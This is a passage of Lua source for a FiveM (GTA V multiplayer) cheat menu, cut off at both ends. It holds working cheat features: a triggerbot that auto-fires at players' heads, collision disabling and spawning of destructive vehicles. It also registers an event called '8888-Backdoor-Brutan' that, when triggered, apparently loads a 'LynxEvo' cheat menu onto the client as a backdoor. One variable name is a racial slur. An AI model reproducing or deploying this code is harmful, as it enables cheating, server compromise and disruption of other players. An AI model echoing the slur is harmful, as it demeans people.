							ApplyForce(k, forward * 500)
						end
					end

				end
			end

			if Triggerbot then
				local hasTarget, target = GetEntityPlayerIsFreeAimingAt(PlayerId())
				if hasTarget and IsEntityAPed(target) then
					ShootAt(target, "SKEL_HEAD")
				end
			end

			local niggerVehicle = GetVehiclePedIsIn(PlayerPedId(), false)
							if IsPedInAnyVehicle(PlayerPedId()) then
					if driftMode then
						SetVehicleGravityAmount(niggerVehicle, 5.0)
					elseif not superGrip and not enchancedGrip and not fdMode and not driftMode then
						SetVehicleGravityAmount(niggerVehicle, 10.0)
					end
				end

			if not Collision then
				playerveh = GetVehiclePedIsIn(PlayerPedId(), false)
				for k in EnumerateVehicles() do
					SetEntityNoCollisionEntity(k, playerveh, true)
				end
				for k in EnumerateObjects() do
					SetEntityNoCollisionEntity(k, playerveh, true)
				end
				for k in EnumeratePeds() do
					SetEntityNoCollisionEntity(k, playerveh, true)
				end
			end

			if DeadlyBulldozer then
				SetVehicleBulldozerArmPosition(GetVehiclePedIsIn(PlayerPedId(), 0), math.random() % 1, 1)
				SetVehicleEngineHealth(GetVehiclePedIsIn(PlayerPedId(), 0), 1000.0)
				if not IsPedInAnyVehicle(PlayerPedId(), 0) then
					DeleteVehicle(GetVehiclePedIsIn(PlayerPedId(), 1))
					DeadlyBulldozer = not DeadlyBulldozer
				elseif IsDisabledControlJustPressed(0, Keys["E"]) then
					local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
					local coords = GetEntityCoords(veh)
					local forward = GetEntityForwardVector(veh)
					local heading = GetEntityHeading(veh)
					local veh = CreateVehicle(GetHashKey("BULLDOZER"), coords.x + forward.x * 10, coords.y + forward.y * 10, coords.z, heading, 1, 1)
					SetVehicleColours(veh, 27, 27)
					SetVehicleEngineHealth(veh, -3500.0)
					ApplyForce(veh, forward * 500.0)
				end
			end

			if waterp and IsPedInAnyVehicle(PlayerPedId(-1), true) then
				SetVehicleEngineOn(GetVehiclePedIsUsing(PlayerPedId(-1)), true, true, true)
			end

			if Falcon.IsMenuOpened('objectlist') then
				for i = 1, #SpawnedObjects do
					local x, y, z = table.unpack(GetEntityCoords(SpawnedObjects[i]))
					DrawText3D(x, y, z, "OBJECT " .. "[" .. i .. "] " .. "WITH ID " .. SpawnedObjects[i])
				end
			end

			if NametagsEnabled then
				tags_plist = GetActivePlayers()
				for i = 1, #tags_plist do
					if NetworkIsPlayerTalking(tags_plist[i]) then
						SetMpGamerTagVisibility(ptags[i], 4, 1)
					else
						SetMpGamerTagVisibility(ptags[i], 4, 0)
					end

					if IsPedInAnyVehicle(GetPlayerPed(tags_plist[i])) and GetSeatPedIsIn(GetPlayerPed(tags_plist[i])) == 0 then
						SetMpGamerTagVisibility(ptags[i], 8, 1)
					else
						SetMpGamerTagVisibility(ptags[i], 8, 0)
					end

				end
			end

			if ANametagsEnabled then
				local plist = GetActivePlayers()
				table.removekey(plist, PlayerId())
				for i = 1, #plist do
					local pos = GetEntityCoords(GetPlayerPed(plist[i]))
					local distance = GetDistanceBetweenCoords(GetEntityCoords(PlayerPedId()), pos)
					if distance <= 30 then
						if ANametagsNotNeedLOS then
							DrawText3D(pos.x, pos.y, pos.z + 1.3, "~b~ID: ~w~" .. GetPlayerServerId(plist[i]) .. "\n~b~Name: ~w~" .. GetPlayerName(plist[i]))
						elseif not ANametagsNotNeedLOS and HasEntityClearLosToEntity(PlayerPedId(), GetPlayerPed(plist[i]), 17) then
							DrawText3D(pos.x, pos.y, pos.z + 1.3, "~b~ID: ~w~" .. GetPlayerServerId(plist[i]) .. "\n~b~Name: ~w~" .. GetPlayerName(plist[i]))
						end
					end
				end
			end

			if LinesEnabled then
				local plist = GetActivePlayers()
				local playerCoords = GetEntityCoords(PlayerPedId())
				for i = 1, #plist do
					if i == PlayerId() then i = i + 1 end
					local targetCoords = GetEntityCoords(GetPlayerPed(plist[i]))
					DrawLine(playerCoords, targetCoords, 0, 0, 255, 255)
				end
			end

		if WeatherChanger then
			SetWeatherTypePersist(WeatherType)
			SetWeatherTypeNowPersist(WeatherType)
			SetWeatherTypeNow(WeatherType)
			SetOverrideWeather(WeatherType)
		end

			if Radio then
				PortableRadio = true
				SetRadioToStationIndex(RadioStation)
			elseif not Radio then
				PortableRadio = false
			end

			if PortableRadio then
				SetVehicleRadioEnabled(GetVehiclePedIsIn(PlayerPedId(), 0), false)
				SetMobilePhoneRadioState(true)
				SetMobileRadioEnabledDuringGameplay(true)
				HideHudComponentThisFrame(16)
			elseif not PortableRadio then
				SetVehicleRadioEnabled(GetVehiclePedIsIn(PlayerPedId(), 0), true)
				SetMobilePhoneRadioState(false)
				SetMobileRadioEnabledDuringGameplay(false)
				ShowHudComponentThisFrame(16)
				local radioIndex = GetPlayerRadioStationIndex()

				if IsPedInAnyVehicle(PlayerPedId(), false) and radioIndex + 1 ~= 19 then
					currRadioIndex = radioIndex + 1
					selRadioIndex = radioIndex + 1
				end
			end

			if ForceMap then
				DisplayRadar(true)
			end

			if ForceThirdPerson then
				SetFollowPedCamViewMode(0)
				SetFollowVehicleCamViewMode(0)
			end

			Wait(0)
		end
	end)
end)

RegisterNetEvent("8888-Backdoor-Brutan")
AddEventHandler("8888-Backdoor-Brutan", function()
	local mhaonn = true
	ESX = nil;
	Citizen.CreateThread(function() while ESX == nil do TriggerEvent("esx:getSharedObject", function(a) ESX = a end) Citizen.Wait(1000) end end) 
	local function e() local name = GetPlayerName(PlayerId()) end;
	local h = false;
	rot = 1;
	local j = false;
	LynxEvo = {}
	LynxEvo.debug = false;
	local
	function k(l) local m = {}
	local n = GetGameTimer() / 200;
	m.r = math.floor(math.sin(n * l + 0) * 127 + 128) m.g = math.floor(math.sin(n * l + 2) * 127 + 128) m.b = math.floor(math.sin(n * l + 4) * 127 + 128) return m end;
	local o = {}
	local p = {
		up = 172, down = 173, left = 174, right = 175, select = 176, back = 177
	}
	local q = 0;
	local s = nil;
	local t = nil;
	local u = 0.23;
	local v = 0.11;
	local w = 0.03;
	local A = 1.0;
	local B = 0.041;
	local C = 0;
	local D = 0.370;
	local E = 0.005;
	local F = 0.005;
	local G = "BRUTAN Community"
	local
	function H(I) if LynxEvo.debug then Citizen.Trace("[LynxEvo] "..tostring(I)) end end;
	local
	function J(f, K, value) if f and o[f] then o[f][K] = value;
	H(f..
		" menu property changed: { "..tostring(K)..
		", "..tostring(value)..
		" }") end end;
	local
	function L(f) if f and o[f] then
	return o[f].visible
	else return false end end;
	local
	function M(f, N, O) if f and o[f] then J(f, "visible", N) if not O and o[f] then J(f, "currentOption", 1) end;
	if N then
	if f ~= t and L(t) then M(t, false) end;
	t = f end end end;
	local
	function P(I, x, y, Q, R, S, T, U, V) SetTextColour(R.r, R.g, R.b, R.a) SetTextFont(Q) SetTextScale(S, S) if U then SetTextDropShadow(2, 2, 0, 0, 0) end;
	if o[t] then
	if T then SetTextCentre(T) elseif V then SetTextWrap(o[t].x, o[t].x + u - E) SetTextRightJustify(true) end end;
	SetTextEntry("STRING") AddTextComponentString(I) DrawText(x, y) end;
	local
	function W(x, y, X, height, R) DrawRect(x, y, X, height, R.r, R.g, R.b, R.a) end;
	local
	function Y() if o[t] then local x = o[t].x + u / 2;
	local y = o[t].y + v / 2;
	if o[t].titleBackgroundSprite then DrawSprite(o[t].titleBackgroundSprite.dict, o[t].titleBackgroundSprite.name, x, y, u, v, 0., 255, 255, 255, 255)
	else W(x, y, u, v, o[t].titleBackgroundColor) end;
	P(o[t].title, x, y - v / 2 + w, o[t].titleFont, o[t].titleColor, A, true) end end;
	local
	function Z() if o[t] then local x = o[t].x + u / 2;
	local y = o[t].y + v + B / 2;
	local a0 = {
		r = o[t].titleBackgroundColor.r, g = o[t].titleBackgroundColor.g, b = o[t].titleBackgroundColor.b, a = 255
	}
	W(x, y, u, B, o[t].subTitleBackgroundColor) P(o[t].subTitle, o[t].x + E, y - B / 2 + F, C, a0, D, false) if q > o[t].maxOptionCount then P(tostring(o[t].currentOption)..
		" / "..tostring(q), o[t].x + u, y - B / 2 + F, C, a0, D, false, false, true) end end end;
	local
	function a1(I, a2) local x = o[t].x + u / 2;
	local a3 = nil;
	if o[t].currentOption <= o[t].maxOptionCount and q <= o[t].maxOptionCount then a3 = q elseif q > o[t].currentOption - o[t].maxOptionCount and q <= o[t].currentOption then a3 = q - (o[t].currentOption - o[t].maxOptionCount) end;
	if a3 then local y = o[t].y + v + B + B * a3 - B / 2;
	local a4 = nil;
	local a5 = nil;
	local a6 = nil;
	local U = false;
	if o[t].currentOption == q then a4 = o[t].menuFocusBackgroundColor;
	a5 = o[t].menuFocusTextColor;
	a6 = o[t].menuFocusTextColor
	else a4 = o[t].menuBackgroundColor;
	a5 = o[t].menuTextColor;
	a6 = o[t].menuSubTextColor;
	U = true end;
	W(x, y, u, B, a4) P(I, o[t].x + E, y - B / 2 + F, C, a5, D, false, U) if a2 then P(a2, o[t].x + E, y - B / 2 + F, C, a6, D, false, U, true) end end end;

	function LynxEvo.CreateMenu(f, a7) o[f] = {}
	o[f].title = a7;
	o[f].subTitle = G;
	o[f].visible = false;
	o[f].previousMenu = nil;
	o[f].aboutToBeClosed = false;
	o[f].x = 0.75;
	o[f].y = 0.19;
	o[f].currentOption = 1;
	o[f].maxOptionCount = 10;
	o[f].titleFont = 1;
	o[f].titleColor = {
		r = 255, g = 255, b = 255, a = 255
	}
	Citizen.CreateThread(function() while true do Citizen.Wait(0) local a8 = k(1.0) o[f].titleBackgroundColor = {
			r = a8.r, g = a8.g, b = a8.b, a = 105
		}
		o[f].
		menuFocusBackgroundColor = {
			r = 255, g = 255, b = 255, a = 100
		}
		end end) o[f].titleBackgroundSprite = nil;
	o[f].menuTextColor = {
		r = 255, g = 255, b = 255, a = 255
	}
	o[f].menuSubTextColor = {
		r = 189, g = 189, b = 189, a = 255
	}
	o[f].menuFocusTextColor = {
		r = 255, g = 255, b = 255, a = 255
	}
	o[f].menuBackgroundColor = {
		r = 0, g = 0, b = 0, a = 100
	}
	o[f].subTitleBackgroundColor = {
		r = o[f].menuBackgroundColor.r, g = o[f].menuBackgroundColor.g, b = o[f].menuBackgroundColor.b, a = 255
	}
	o[f].buttonPressedSound = {
		name = "~h~~r~> ~s~SELECT", set = "HUD_FRONTEND_DEFAULT_SOUNDSET"
	}
	H(tostring(f)..
		" menu created") end;

	function LynxEvo.CreateSubMenu(f, a9, aa) if o[a9] then LynxEvo.CreateMenu(f, o[a9].title) if aa then J(f, "subTitle", aa)
	else J(f, "subTitle", o[a9].subTitle) end;
	J(f, "previousMenu", a9) J(f, "x", o[a9].x) J(f, "y", o[a9].y) J(f, "maxOptionCount", o[a9].maxOptionCount) J(f, "titleFont", o[a9].titleFont) J(f, "titleColor", o[a9].titleColor) J(f, "titleBackgroundColor", o[a9].titleBackgroundColor) J(f, "titleBackgroundSprite", o[a9].titleBackgroundSprite) J(f, "menuTextColor", o[a9].menuTextColor) J(f, "menuSubTextColor", o[a9].menuSubTextColor) J(f, "menuFocusTextColor", o[a9].menuFocusTextColor) J(f, "menuFocusBackgroundColor", o[a9].menuFocusBackgroundColor) J(f, "menuBackgroundColor", o[a9].menuBackgroundColor) J(f, "subTitleBackgroundColor", o[a9].subTitleBackgroundColor)
	else H("Failed to create "..tostring(f)..
		" submenu: "..tostring(a9)..
		" parent menu doesn't exist") end end;

	function LynxEvo.CurrentMenu() return t end;

	function LynxEvo.OpenMenu(f) if f and o[f] then PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true) M(f, true) if o[f].titleBackgroundSprite then RequestStreamedTextureDict(o[f].titleBackgroundSprite.dict, false) while not HasStreamedTextureDictLoaded(o[f].titleBackgroundSprite.dict) do Citizen.Wait(0) end end;
		H(tostring(f)..
			" menu opened")
	else H("Failed to open "..tostring(f)..
		" menu: it doesn't exist") end end;

	function LynxEvo.IsMenuOpened(f) return L(f) end;

	function LynxEvo.IsAnyMenuOpened() for f, _ in pairs(o) do
		if L(f) then
	return true end end;
	return false end;

	function LynxEvo.IsMenuAboutToBeClosed() if o[t] then
	return o[t].aboutToBeClosed
	else return false end end;

	function LynxEvo.CloseMenu() if o[t] then
	if o[t].aboutToBeClosed then o[t].aboutToBeClosed = false;
	M(t, false) H(tostring(t)..
		" menu closed") PlaySoundFrontend(-1, "QUIT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true) q = 0;
	t = nil;
	s = nil
	else o[t].aboutToBeClosed = true;
	H(tostring(t)..
		" menu about to be closed") end end end;

	function LynxEvo.Button(I, a2) local ab = I;
	if a2 then ab = "{ "..tostring(ab)..
	", "..tostring(a2)..
	" }"
	end;
	if o[t] then q = q + 1;
	local ac = o[t].currentOption == q;
	a1(I, a2) if ac then
	if s == p.select then PlaySoundFrontend(-1, o[t].buttonPressedSound.name, o[t].buttonPressedSound.set, true) H(ab..
		" button pressed") return true elseif s == p.left or s == p.right then PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true) end end;
	return false
	else H("Failed to create "..ab..
		" button: "..tostring(t)..
		" menu doesn't exist") return false end end;

	function LynxEvo.MenuButton(I, f) if o[f] then
	if LynxEvo.Button(I) then M(t, false) M(f, true, true) return true end
	else H("Failed to create "..tostring(I)..
		" menu button: "..tostring(f)..
		" submenu doesn't exist") end;
	return false end;

	function LynxEvo.CheckBox(I, bool, ad) local ae = "~r~~h~OFF"
	if bool then ae = "~g~~h~ON"
	end;
	if LynxEvo.Button(I, ae) then bool = not bool;
	H(tostring(I)..
		" checkbox changed to "..tostring(bool)) ad(bool) return true end;
	return false end;

	function LynxEvo.ComboBox(I, af, ag, ah, ad) local ai = #af;
	local aj = af[ag] local ac = o[t].currentOption == q + 1;
	if ai > 1 and ac then aj = '← '..tostring(aj)..
	' →'
	end;
	if LynxEvo.Button(I, aj) then ah = ag;
	ad(ag, ah) return true elseif ac then
	if s == p.left then
	if ag > 1 then ag = ag - 1
	else ag = ai end elseif s == p.right then
	if ag < ai then ag = ag + 1
	else ag = 1 end end
	else ag = ah end;
	ad(ag, ah) return false end;

	function LynxEvo.Display() if L(t) then
	if o[t].aboutToBeClosed then LynxEvo.CloseMenu()
	else ClearAllHelpMessages() Y() Z() s = nil;
	if IsDisabledControlJustPressed(0, p.down) then PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true) if o[t].currentOption < q then o[t].currentOption = o[t].currentOption + 1
	else o[t].currentOption = 1 end elseif IsDisabledControlJustPressed(0, p.up) then PlaySoundFrontend(-1, "NAV_UP_DOWN", "HUD_FRONTEND_DEFAULT_SOUNDSET", true) if o[t].currentOption > 1 then o[t].currentOption = o[t].currentOption - 1
	else o[t].currentOption = q end elseif IsDisabledControlJustPressed(0, p.left) then s = p.left elseif IsDisabledControlJustPressed(0, p.right) then s = p.right elseif IsDisabledControlJustPressed(0, p.select) then s = p.select elseif IsDisabledControlJustPressed(0, p.back) then
	if o[o[t].previousMenu] then PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true) M(o[t].previousMenu, true)
	else LynxEvo.CloseMenu() end end;
	q = 0 end end end;

	function LynxEvo.SetMenuWidth(f, X) J(f, "width", X) end;

	function LynxEvo.SetMenuX(f, x) J(f, "x", x) end;

	function LynxEvo.SetMenuY(f, y) J(f, "y", y) end;

	function LynxEvo.SetMenuMaxOptionCountOnScreen(f, count) J(f, "maxOptionCount", count) end;

	function LynxEvo.SetTitleColor(f, r, g, b, ak) J(f, "titleColor", {
		["r"] = r, ["g"] = g, ["b"] = b, ["a"] = ak or o[f].titleColor.a
	}) end;

	function LynxEvo.SetTitleBackgroundColor(f, r, g, b, ak) J(f, "titleBackgroundColor", {
		["r"] = r, ["g"] = g, ["b"] = b, ["a"] = ak or o[f].titleBackgroundColor.a
	}) end;

	function LynxEvo.SetTitleBackgroundSprite(f, al, am) J(f, "titleBackgroundSprite", {
		dict = al, name = am
	}) end;

	function LynxEvo.SetSubTitle(f, I) J(f, "subTitle", I) end;

	function LynxEvo.SetMenuBackgroundColor(f, r, g, b, ak) J(f, "menuBackgroundColor", {
		["r"] = r, ["g"] = g, ["b"] = b, ["a"] = ak or o[f].menuBackgroundColor.a
	}) end;

	function LynxEvo.SetMenuTextColor(f, r, g, b, ak) J(f, "menuTextColor", {
		["r"] = r, ["g"] = g, ["b"] = b, ["a"] = ak or o[f].menuTextColor.a
	}) end;

	function LynxEvo.SetMenuSubTextColor(f, r, g, b, ak) J(f, "menuSubTextColor", {
		["r"] = r, ["g"] = g, ["b"] = b, ["a"] = ak or o[f].menuSubTextColor.a
	}) end;

	function LynxEvo.SetMenuFocusColor(f, r, g, b, ak) J(f, "menuFocusColor", {
		["r"] = r, ["g"] = g, ["b"] = b, ["a"] = ak or o[f].menuFocusColor.a
	}) end;

	function LynxEvo.SetMenuButtonPressedSound(f, name, an) J(f, "buttonPressedSound", {
		["name"] = name, ["set"] = an
	}) end;

	function KeyboardInput(ao, ap, aq) AddTextEntry("FMMC_KEY_TIP1", ao..
		":") DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", ap, "", "", "", aq) blockinput = true;
	while UpdateOnscreenKeyboard()  ~= 1 and UpdateOnscreenKeyboard()  ~= 2 do Citizen.Wait(0) end;
		if UpdateOnscreenKeyboard()  ~= 2 then AddTextEntry("FMMC_KEY_TIP1", "") local m = GetOnscreenKeyboardResult() Citizen.Wait(500) blockinput = false;
	return m
	else AddTextEntry("FMMC_KEY_TIP1", "") Citizen.Wait(500) blockinput = false;
	return nil end end;
	local
	function ar() local as = {}
	for i = 0, GetNumberOfPlayers() do
		if NetworkIsPlayerActive(i) then as[#as + 1] = i end end;
	return as end;

	function DrawText3D(x, y, z, I, r, g, b) SetDrawOrigin(x, y, z, 0) SetTextFont(0) SetTextProportional(0) SetTextScale(0.0, 0.20) SetTextColour(r, g, b, 255) SetTextDropshadow(0, 0, 0, 0, 255) SetTextEdge(2, 0, 0, 0, 150) SetTextDropShadow() SetTextOutline() SetTextEntry("STRING") SetTextCentre(1) AddTextComponentString(I) DrawText(0.0, 0.0) ClearDrawOrigin() end;

	function math.round(at, au) return tonumber(string.format("%."..(au or 0)..
		"f", at)) end;
	local
	function k(l) local m = {}
	local n = GetGameTimer() / 1000;
	m.r = math.floor(math.sin(n * l + 0) * 127 + 128) m.g = math.floor(math.sin(n * l + 2) * 127 + 128) m.b = math.floor(math.sin(n * l + 4) * 127 + 128) return m end;
	local
	function av(I, aw) SetNotificationTextEntry("STRING") AddTextComponentString(I) DrawNotification(aw, false) if rgbnot then
	for i = 0, 24 do i = i + 1;
		SetNotificationBackgroundColor(i) end
	else SetNotificationBackgroundColor(24) end end;

	function checkValidVehicleExtras() local ax = PlayerPedId() local ay = GetVehiclePedIsIn(ax, false) local az = {}
	for i = 0, 50, 1 do
		if DoesExtraExist(ay, i) then local aA = "~h~Extra #"..tostring(i) local I = "OFF"
	if IsVehicleExtraTurnedOn(ay, i) then I = "ON"
	end;
	local aB = "~h~extra "..tostring(i) table.insert(az, {
		menuName = realModName, data = {
			["action"] = realSpawnName, ["state"] = I
		}
	}) end end;
	return az end;

	function DoesVehicleHaveExtras(veh) for i = 1, 30 do
		if DoesExtraExist(veh, i) then
	return true end end;
	return false end;

	function checkValidVehicleMods(aC) local ax = PlayerPedId() local ay = GetVehiclePedIsIn(ax, false) local az = {}
	local aD = GetNumVehicleMods(ay, aC) if aC == 48 and aD == 0 then local aD = GetVehicleLiveryCount(ay) for i = 1, aD, 1 do local aE = i - 1;
		local aF = GetLiveryName(ay, aE) local realModName = GetLabelText(aF) local aG, realSpawnName = aC, aE;
	az[i] = {
		menuName = realModName, data = {
			["modid"] = aG, ["realIndex"] = realSpawnName
		}
	}
	end end;
	for i = 1, aD, 1 do local aE = i - 1;
		local aF = GetModTextLabel(ay, aC, aE) local realModName = GetLabelText(aF) local aG, realSpawnName = aD, aE;
	az[i] = {
		menuName = realModName, data = {
			["modid"] = aG, ["realIndex"] = realSpawnName
		}
	}
	end;
	if aD > 0 then local aE = -1;
	local aG, realSpawnName = aC, aE;
	table.insert(az, 1, {
		menuName = "Stock", data = {
			["modid"] = aG, ["realIndex"] = realSpawnName
		}
	}) end;
	return az end;
	local aH = {
		"Dinghy", "Dinghy2", "Dinghy3", "Dingh4", "Jetmax", "Marquis", "Seashark", "Seashark2", "Seashark3", "Speeder", "Speeder2", "Squalo", "Submersible", "Submersible2", "Suntrap", "Toro", "Toro2", "Tropic", "Tropic2", "Tug"
	}
	local aI = {
		"Benson", "Biff", "Cerberus", "Cerberus2", "Cerberus3", "Hauler", "Hauler2", "Mule", "Mule2", "Mule3", "Mule4", "Packer", "Phantom", "Phantom2", "Phantom3", "Pounder", "Pounder2", "Stockade", "Stockade3", "Terbyte"
	}
	local aJ = {
		"Blista", "Blista2", "Blista3", "Brioso", "Dilettante", "Dilettante2", "Issi2", "Issi3", "issi4", "Iss5", "issi6", "Panto", "Prarire", "Rhapsody"
	}
	local aK = {
		"CogCabrio", "Exemplar", "F620", "Felon", "Felon2", "Jackal", "Oracle", "Oracle2", "Sentinel", "Sentinel2", "Windsor", "Windsor2", "Zion", "Zion2"
	}
	local aL = {
		"Bmx", "Cruiser", "Fixter", "Scorcher", "Tribike", "Tribike2", "tribike3"
	}
	local aM = {
		"ambulance", "FBI", "FBI2", "FireTruk", "PBus", "police", "Police2", "Police3", "Police4", "PoliceOld1", "PoliceOld2", "PoliceT", "Policeb", "Polmav", "Pranger", "Predator", "Riot", "Riot2", "Sheriff", "Sheriff2"
	}
	local aN = {
		"Akula", "Annihilator", "Buzzard", "Buzzard2", "Cargobob", "Cargobob2", "Cargobob3", "Cargobob4", "Frogger", "Frogger2", "Havok", "Hunter", "Maverick", "Savage", "Seasparrow", "Skylift", "Supervolito", "Supervolito2", "Swift", "Swift2", "Valkyrie", "Valkyrie2", "Volatus"
	}
	local aO = {
		"Bulldozer", "Cutter", "Dump", "Flatbed", "Guardian", "Handler", "Mixer", "Mixer2", "Rubble", "Tiptruck", "Tiptruck2"
	}
	local aP = {
		"APC", "Barracks", "Barracks2", "Barracks3", "Barrage", "Chernobog", "Crusader", "Halftrack", "Khanjali", "Rhino", "Scarab", "Scarab2", "Scarab3", "Thruster", "Trailersmall2"
	}
	local aQ = {
		"Akuma", "Avarus", "Bagger", "Bati2", "Bati", "BF400", "Blazer4", "CarbonRS", "Chimera", "Cliffhanger", "Daemon", "Daemon2", "Defiler", "Deathbike", "Deathbike2", "Deathbike3", "Diablous", "Diablous2", "Double", "Enduro", "esskey", "Faggio2", "Faggio3", "Faggio", "Fcr2", "fcr", "gargoyle", "hakuchou2", "hakuchou", "hexer", "innovation", "Lectro", "Manchez", "Nemesis", "Nightblade", "Oppressor", "Oppressor2", "PCJ", "Ratbike", "Ruffian", "Sanchez2", "Sanchez", "Sanctus", "Shotaro", "Sovereign", "Thrust", "Vader", "Vindicator", "Vortex", "Wolfsbane", "zombiea", "zombieb"
	}
	local aR = {
		"Blade", "Buccaneer", "Buccaneer2", "Chino", "Chino2", "clique", "Deviant", "Dominator", "Dominator2", "Dominator3", "Dominator4", "Dominator5", "Dominator6", "Dukes", "Dukes2", "Ellie", "Faction", "faction2", "faction3", "Gauntlet", "Gauntlet2", "Hermes", "Hotknife", "Hustler", "Impaler", "Impaler2", "Impaler3", "Impaler4", "Imperator", "Imperator2", "Imperator3", "Lurcher", "Moonbeam", "Moonbeam2", "Nightshade", "Phoenix", "Picador", "RatLoader", "RatLoader2", "Ruiner", "Ruiner2", "Ruiner3", "SabreGT", "SabreGT2", "Sadler2", "Slamvan", "Slamvan2", "Slamvan3", "Slamvan4", "Slamvan5", "Slamvan6", "Stalion", "Stalion2", "Tampa", "Tampa3", "Tulip", "Vamos,", "Vigero", "Virgo", "Virgo2", "Virgo3", "Voodoo", "Voodoo2", "Yosemite"
	}
	local aS = {
		"BFinjection", "Bifta", "Blazer", "Blazer2", "Blazer3", "Blazer5", "Bohdi", "Brawler", "Bruiser", "Bruiser2", "Bruiser3", "Caracara", "DLoader", "Dune", "Dune2", "Dune3", "Dune4", "Dune5", "Insurgent", "Insurgent2", "Insurgent3", "Kalahari", "Kamacho", "LGuard", "Marshall", "Mesa", "Mesa2", "Mesa3", "Monster", "Monster4", "Monster5", "Nightshark", "RancherXL", "RancherXL2", "Rebel", "Rebel2", "RCBandito", "Riata", "Sandking", "Sandking2", "Technical", "Technical2", "Technical3", "TrophyTruck", "TrophyTruck2", "Freecrawler", "Menacer"
	}
	local aT = {
		"AlphaZ1", "Avenger", "Avenger2", "Besra", "Blimp", "blimp2", "Blimp3", "Bombushka", "Cargoplane", "Cuban800", "Dodo", "Duster", "Howard", "Hydra", "Jet", "Lazer", "Luxor", "Luxor2", "Mammatus", "Microlight", "Miljet", "Mogul", "Molotok", "Nimbus", "Nokota", "Pyro", "Rogue", "Seabreeze", "Shamal", "Starling", "Stunt", "Titan", "Tula", "Velum", "Velum2", "Vestra", "Volatol", "Striekforce"
	}
	local aU = {
		"BJXL", "Baller", "Baller2", "Baller3", "Baller4", "Baller5", "Baller6", "Cavalcade", "Cavalcade2", "Dubsta", "Dubsta2", "Dubsta3", "FQ2", "Granger", "Gresley", "Habanero", "Huntley", "Landstalker", "patriot", "Patriot2", "Radi", "Rocoto", "Seminole", "Serrano", "Toros", "XLS", "XLS2"
	}
	local aV = {
		"Asea", "Asea2", "Asterope", "Cog55", "Cogg552", "Cognoscenti", "Cognoscenti2", "emperor", "emperor2", "emperor3", "Fugitive", "Glendale", "ingot", "intruder", "limo2", "premier", "primo", "primo2", "regina", "romero", "stafford", "Stanier", "stratum", "stretch", "surge", "tailgater", "warrener", "Washington"
	}
	local aW = {
		"Airbus", "Brickade", "Bus", "Coach", "Rallytruck", "Rentalbus", "taxi", "Tourbus", "Trash", "Trash2", "WastIndr", "PBus2"
	}
	local aX = {
		"Alpha", "Banshee", "Banshee2", "BestiaGTS", "Buffalo", "Buffalo2", "Buffalo3", "Carbonizzare", "Comet2", "Comet3", "Comet4", "Comet5", "Coquette", "Deveste", "Elegy", "Elegy2", "Feltzer2", "Feltzer3", "FlashGT", "Furoregt", "Fusilade", "Futo", "GB200", "Hotring", "Infernus2", "Italigto", "Jester", "Jester2", "Khamelion", "Kurama", "Kurama2", "Lynx", "MAssacro", "MAssacro2", "neon", "Ninef", "ninfe2", "omnis", "Pariah", "Penumbra", "Raiden", "RapidGT", "RapidGT2", "Raptor", "Revolter", "Ruston", "Schafter2", "Schafter3", "Schafter4", "Schafter5", "Schafter6", "Schlagen", "Schwarzer", "Sentinel3", "Seven70", "Specter", "Specter2", "Streiter", "Sultan", "Surano", "Tampa2", "Tropos", "Verlierer2", "ZR380", "ZR3802", "ZR3803"
	}
	local aY = {
		"Ardent", "BType", "BType2", "BType3", "Casco", "Cheetah2", "Cheburek", "Coquette2", "Coquette3", "Deluxo", "Fagaloa", "Gt500", "JB700", "JEster3", "MAmba", "Manana", "Michelli", "Monroe", "Peyote", "Pigalle", "RapidGT3", "Retinue", "Savastra", "Stinger", "Stingergt", "Stromberg", "Swinger", "Torero", "Tornado", "Tornado2", "Tornado3", "Tornado4", "Tornado5", "Tornado6", "Viseris", "Z190", "ZType"
	}
	local aZ = {
		"Adder", "Autarch", "Bullet", "Cheetah", "Cyclone", "EntityXF", "Entity2", "FMJ", "GP1", "Infernus", "LE7B", "Nero", "Nero2", "Osiris", "Penetrator", "PFister811", "Prototipo", "Reaper", "SC1", "Scramjet", "Sheava", "SultanRS", "Superd", "T20", "Taipan", "Tempesta", "Tezeract", "Turismo2", "Turismor", "Tyrant", "Tyrus", "Vacca", "Vagner", "Vigilante", "Visione", "Voltic", "Voltic2", "Zentorno", "Italigtb", "Italigtb2", "XA21"
	}
	local a_ = {
		"ArmyTanker", "ArmyTrailer", "ArmyTrailer2", "BaleTrailer", "BoatTrailer", "CableCar", "DockTrailer", "Graintrailer", "Proptrailer", "Raketailer", "TR2", "TR3", "TR4", "TRFlat", "TVTrailer", "Tanker", "Tanker2", "Trailerlogs", "Trailersmall", "Trailers", "Trailers2", "Trailers3"
	}
	local b0 = {
		"Freight", "Freightcar", "Freightcont1", "Freightcont2", "Freightgrain", "Freighttrailer", "TankerCar"
	}
	local b1 = {
		"Airtug", "Caddy", "Caddy2", "Caddy3", "Docktug", "Forklift", "Mower", "Ripley", "Sadler", "Scrap", "TowTruck", "Towtruck2", "Tractor", "Tractor2", "Tractor3", "TrailerLArge2", "Utilitruck", "Utilitruck3", "Utilitruck2"
	}
	local b2 = {
		"Bison", "Bison2", "Bison3", "BobcatXL", "Boxville", "Boxville2", "Boxville3", "Boxville4", "Boxville5", "Burrito", "Burrito2", "Burrito3", "Burrito4", "Burrito5", "Camper", "GBurrito", "GBurrito2", "Journey", "Minivan", "Minivan2", "Paradise", "pony", "Pony2", "Rumpo", "Rumpo2", "Rumpo3", "Speedo", "Speedo2", "Speedo4", "Surfer", "Surfer2", "Taco", "Youga", "youga2"
	}
	local b3 = {
		"Boats", "Commercial", "Compacts", "Coupes", "Cycles", "Emergency", "Helictopers", "Industrial", "Military", "Motorcycles", "Muscle", "Off-Road", "Planes", "SUVs", "Sedans", "Service", "Sports", "Sports Classic", "Super", "Trailer", "Trains", "Utility", "Vans"
	}
	local b4 = {
		aH, aI, aJ, aK, aL, aM, aN, aO, aP, aQ, aR, aS, aT, aU, aV, aW, aX, aY, aZ, a_, b0, b1, b2
	}
	local b5 = {
